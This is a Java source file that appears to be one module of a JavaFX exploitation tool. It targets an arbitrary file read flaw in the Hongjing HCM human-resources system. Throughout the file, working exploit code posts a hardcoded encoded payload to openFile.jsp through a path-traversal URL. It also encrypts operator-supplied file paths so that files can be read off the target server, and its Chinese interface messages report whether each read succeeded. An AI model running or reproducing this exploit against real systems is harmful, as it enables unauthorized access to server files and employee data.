package exp.oa.hongjingoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.util.HashMap;

public class hongjing_hcm_openFile_FileRead implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea,textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url,cmd, textArea,textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 不支持getshell功能");
        });
        return false;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        String payload = "filename=8uHo1M8Ok6bZ468mKmzw7xWCzPAATTP2HJBPAATTP8j8sjHiBmsb9ThhDsrcV8PAATTP2HJBPAATTPG67rw8nTSnppHAL6UwTPAATTP2HJBPAATTPZPAATTP2HJBPAATTP9x5w4PAATTP3HJDPAATTP";
        try {
            HashMap<String, String> head = new HashMap<>();
            Response get_res = HttpTools.post(url + "/templates/attestation/../../general/muster/hmuster/openFile.jsp", payload,new HashMap<>(), "utf-8");
            if (get_res.getCode() == 200 && get_res.getText()!="") {
                Platform.runLater(() -> {
//                    textArea.appendText("\n 漏洞存在 输入cmd开始构造回显");
                    textArea.appendText("\n [ hongjing_hcm_openFile_FileRead ]");
                    textArea.appendText("\n 输入文件路径进行读取");
                    textArea.appendText("\n eg: ../webapps/hrms/general/muster/hmuster/openFile.jsp");
                    textArea_cmd.appendText("\n"+get_res.getText());
                });


                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
//                textArea.appendText("\n yongyou_nc_NCFindWeb_OverList-漏洞不存在");
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }


    private Boolean attcmd(String url, String cmd, TextArea textArea,TextArea textArea_cmd) {
        String payload = "filename="+decrypt.hongjing.HrmsCrypt.encryptEncode(cmd);
        try{
            HashMap<String, String> head = new HashMap<>();
            Response get_res = HttpTools.post(url + "/templates/attestation/../../general/muster/hmuster/openFile.jsp", payload,new HashMap<>(), "utf-8");
            if (get_res.getCode() == 200 && get_res.getText()!="") {
                    Platform.runLater(() -> {
                        textArea.appendText("\n "+ cmd +" 读取成功！");
                        textArea_cmd.appendText("\n"+get_res.getText());
                    });
                    return true;
                } else {
                    Platform.runLater(() -> {
                        textArea.appendText("\n "+ cmd +" 读取失败！");
                    });
                    return false;
                }

        } catch (Exception e) {
            Platform.runLater(() -> {
//                textArea.appendText("\n yongyou_nc_UploadServlet_serial-漏洞不存在");
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
